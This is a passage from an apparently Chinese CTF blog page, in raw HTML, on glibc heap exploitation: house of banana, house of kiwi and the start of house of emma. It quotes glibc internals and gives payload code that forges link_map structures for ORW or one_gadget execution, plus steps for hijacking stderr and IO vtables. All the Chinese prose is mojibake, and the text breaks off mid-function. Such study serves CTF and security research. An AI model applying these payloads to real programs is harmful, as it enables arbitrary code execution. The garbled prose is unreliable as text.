title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>å›´ç»• <code>tcache_perthread_struct</code> è¿›è¡Œæ”»å‡»</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-14"><a href="#åˆ©ç”¨æ•ˆæœ-14" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li></ul><h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><h3 id="æ¼æ´æˆå› -16"><a href="#æ¼æ´æˆå› -16" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-16"><a href="#é€‚ç”¨èŒƒå›´-16" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥è¿›è¡Œ <code>largebin attack</code></li><li>èƒ½æ‰§è¡Œ <code>exit</code> å‡½æ•°</li></ul><h3 id="åˆ©ç”¨åŸç†-16"><a href="#åˆ©ç”¨åŸç†-16" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">        l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">            || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (<span class="built_in">GLRO</span>(dl_debug_mask)</span><br><span class="line">                                  &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">                _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                                  <span class="built_in">DSO_FILENAME</span> (l-&gt;l_name),</span><br><span class="line">                                  ns);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">            <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">                    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">                                    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                                  / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">                <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                    ((<span class="type">fini_t</span>) array[i]) ();  <span class="comment">//è°ƒç”¨å‡½æ•°</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">            <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">DL_CALL_DT_FINI</span></span><br><span class="line">                (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">        _dl_audit_objclose (l);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">    --l-&gt;l_direct_opencount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">                    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<span class="comment">//DT_FINI_ARRAY=26 d_un.d_ptråç§»ä¸º8</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å°†<code>l-&gt;l_info[26]</code>å†™å…¥<code>l_info[26]</code>çš„åœ°å€ï¼Œ<code>array</code>çš„å€¼å°±æ˜¯<code>l_info[27]</code>ä¸­å­˜æ”¾çš„å€¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                  / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr))); <span class="comment">//DT_FINI_ARRAYSZ=28ï¼Œè¿˜æ˜¯åç§»8</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨<code>l_info[28]</code>å†™å…¥<code>l_info[28]</code>çš„åœ°å€ï¼Œ<code>i</code>çš„å€¼å°±æ˜¯<code>l_info[29]ä¸­å­˜æ”¾çš„å€¼/8</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="type">fini_t</span>) array[i]) ();  <span class="comment">//è°ƒç”¨å‡½æ•°</span></span><br></pre></td></tr></table></figure><p>æœ€åä¼šæ‰§è¡Œ<code>array[i]-&gt;array[0]</code>ï¼Œä»iåˆ°0è°ƒç”¨</p><p><strong>2.31æ‰“orwï¼š</strong></p><ul><li><p>é€šè¿‡largebin attackä¼ªé€ <code>_rtld_global</code>çš„<code>link_map</code>åœ°å€</p></li><li><p>ç„¶åå¸ƒå±€link_mapæ‰“orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>2.27æ‰“onegadgetï¼š</strong></p><ul><li><p>link_mapï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">link_map=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">1</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(libc_base+<span class="number">0x61c710</span>)#l_next</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xb90</span>)#l_real</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>)<span class="meta">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">8</span>)#<span class="comment">//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(one_gadget)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(heap_base+<span class="number">0xb90</span>)</span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0</span>)*<span class="number">58</span></span><br><span class="line">link_map+=<span class="built_in">p64</span>(<span class="number">0x800000000</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="ç›¸å…³æŠ€å·§-16"><a href="#ç›¸å…³æŠ€å·§-16" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>ä¼ªé€  <code>fini_array</code> æ•°ç»„çš„æ—¶å€™ï¼Œæ˜¯ä»åå¾€å‰éå†çš„</li><li>æœ‰æ—¶å€™è¿œç¨‹çš„ <code>rtld_global</code> çš„åç§»ä¸æœ¬åœ°ä¸ä¸€æ ·ï¼Œéœ€è¦çˆ†ç ´</li><li>å¦‚æœä¸æƒ³é€ä¸ªä¼ªé€ ï¼Œå¯ä»¥ç›´æ¥ç”¨ <code>gdb</code> ä»å†…å­˜é‡Œé¢ <code>dump</code> å‡ºæ¥ï¼Œç„¶ååŸºäºåç§»ä¿®æ”¹å†…å­˜å³å¯</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-15"><a href="#åˆ©ç”¨æ•ˆæœ-15" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„ä»£ç æ‰§è¡Œ</li></ul><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><h3 id="æ¼æ´æˆå› -17"><a href="#æ¼æ´æˆå› -17" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-17"><a href="#é€‚ç”¨èŒƒå›´-17" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.36</code></li><li>åœ¨ <code>malloc</code> æµç¨‹ä¸­è§¦å‘ <code>assert</code></li></ul><h3 id="åˆ©ç”¨åŸç†-17"><a href="#åˆ©ç”¨åŸç†-17" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>ä¸»è¦æ˜¯æä¾›äº†ä¸€ç§åœ¨ç¨‹åºä¸­è°ƒç”¨ <code>IO</code> æµå‡½æ•°çš„æ€è·¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> IS_IN (libc)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NDEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)\</span></span><br><span class="line"><span class="meta"> __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨åˆ°äº† <code>fxprintf</code> å’Œ <code>fflush(stderr)</code>ã€‚å¯¹stderrè¿›è¡ŒåŠ«æŒ</p><p>åœ¨<code>_int_malloc</code>ä¸­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¯¹topè¿›è¡Œäº†assertåˆ¤æ–­</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">old_size &gt;= <span class="number">0x20</span>;</span><br><span class="line">old_top.prev_inuse = <span class="number">0</span>;</span><br><span class="line">old_topé¡µå¯¹é½</span><br></pre></td></tr></table></figure><p>å› æ­¤åªè¦å †æº¢å‡ºæ”¹ä¸ªsizeå°±å¯ä»¥è§¦å‘assertäº†</p><p>åœ¨<code>__fxprintf</code>å‡½æ•°ä¸­è°ƒç”¨çš„æ˜¯åç§»0x38çš„æŒ‡é’ˆ</p><p>åœ¨<code>fflush</code>å‡½æ•°ä¸­è°ƒç”¨åˆ°äº†ä¸€ä¸ªæŒ‡é’ˆ:ä½äº<code>_IO_file_jumps</code>ä¸­çš„<code>_IO_file_sync</code>æŒ‡é’ˆ,ä¸”è§‚å¯Ÿå‘ç°RDXå¯„å­˜å™¨çš„å€¼ä¸º<code>IO_helper_jumps</code>æŒ‡é’ˆ</p><p>å› æ­¤æœ‰ä»¥ä¸‹çš„åˆ©ç”¨ï¼š</p><ul><li>é€šè¿‡largebin attackåŠ«æŒstderræŒ‡é’ˆ</li><li>é€šè¿‡å †æº¢å‡ºæˆ–å…¶ä»–æ‰‹æ³•è§¦å‘assert</li><li>ä¿®æ”¹ <code>_IO_file_jumps + 0x60</code>çš„<code>_IO_file_sync</code>æŒ‡é’ˆä¸º<code>setcontext+61</code></li><li>ä¿®æ”¹<code>IO_helper_jumps + 0xA0 and 0xA8</code>åˆ†åˆ«ä¸ºå¯è¿ç§»çš„å­˜æ”¾æœ‰ROPçš„ä½ç½®å’ŒretæŒ‡ä»¤çš„gadgetä½ç½®,åˆ™å¯ä»¥è¿›è¡Œæ ˆè¿ç§»(æ„Ÿè§‰æ¡ä»¶è¦æ±‚å¥½å¤šï¼Œä½†æ˜¯å¯¹äºassertè§¦å‘çš„IOå¯ä»¥åˆ©ç”¨)</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-16"><a href="#åˆ©ç”¨æ•ˆæœ-16" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>è§¦å‘ <code>IO</code> å¤„ç†æµç¨‹ï¼Œä¸ºåç»­åˆ©ç”¨åšå‡†å¤‡</li></ul><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><h3 id="æ¼æ´æˆå› -18"><a href="#æ¼æ´æˆå› -18" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡º</p><h3 id="é€‚ç”¨èŒƒå›´-18"><a href="#é€‚ç”¨èŒƒå›´-18" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯ä»¥è¿›è¡Œä¸¤æ¬¡ <code>largebin attack</code></li><li>æˆ–è€…å¯ä»¥è¿›è¡Œä¸¤æ¬¡ä»»æ„åœ°å€å†™å †åœ°å€</li><li>å¯ä»¥è§¦å‘ <code>IO</code> æµæ“ä½œ</li></ul><h3 id="åˆ©ç”¨åŸç†-18"><a href="#åˆ©ç”¨åŸç†-18" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åœ¨vtableçš„åˆæ³•èŒƒå›´ä¹‹å†…ï¼Œå­˜åœ¨<code>_IO_cookie_jumps</code>ï¼Œå¯ä»¥é€šè¿‡åç§»æ¥è°ƒç”¨vtableè¡¨é‡Œçš„æ‰€æœ‰å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_file_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, _IO_file_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, _IO_file_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_file_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_file_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_file_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_file_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_cookie_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_cookie_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_cookie_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_cookie_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write; <span class="comment">//0xf0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = <span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">   || (<span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">       == <span class="number">-1</span>)</span><br><span class="line">   || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = 